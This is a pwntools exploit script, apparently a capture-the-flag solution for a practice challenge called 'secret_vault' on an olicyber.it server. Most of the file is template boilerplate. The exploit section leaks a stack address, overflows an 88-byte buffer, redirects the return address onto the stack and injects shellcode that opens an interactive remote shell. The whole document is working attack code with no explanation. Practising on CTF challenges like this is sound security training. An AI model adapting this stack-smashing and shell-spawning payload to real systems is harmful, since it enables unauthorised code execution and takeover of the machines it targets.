#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template ./secret_vault --host vault.challs.olicyber.it --port 10006
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or './secret_vault')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141 EXE=/tmp/executable
host = args.HOST or 'vault.challs.olicyber.it'
port = int(args.PORT or 10006)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX unknown - GNU_STACK missing
# PIE:      No PIE (0x400000)
# Stack:    Executable
# RWX:      Has RWX segments

io = start()

import re

offset = 88

io.sendlineafter(b'>', b'1')
io.sendlineafter(b'messaggio:\n', b'a')
ret = io.recvline().decode().strip()
buff_addr = re.findall(r'(0x[0-9a-f]+)', ret)[0]
buff_addr = int(buff_addr, 16)
#print(hex(buff_addr))

io.sendlineafter(b'>', b'1')
shellcode = asm(shellcraft.sh())
payload = b'a' * offset + p64(buff_addr + offset + 8) + shellcode
io.sendlineafter(b'messaggio:\n', payload)
io.sendlineafter(b'>', b'3')

io.interactive()

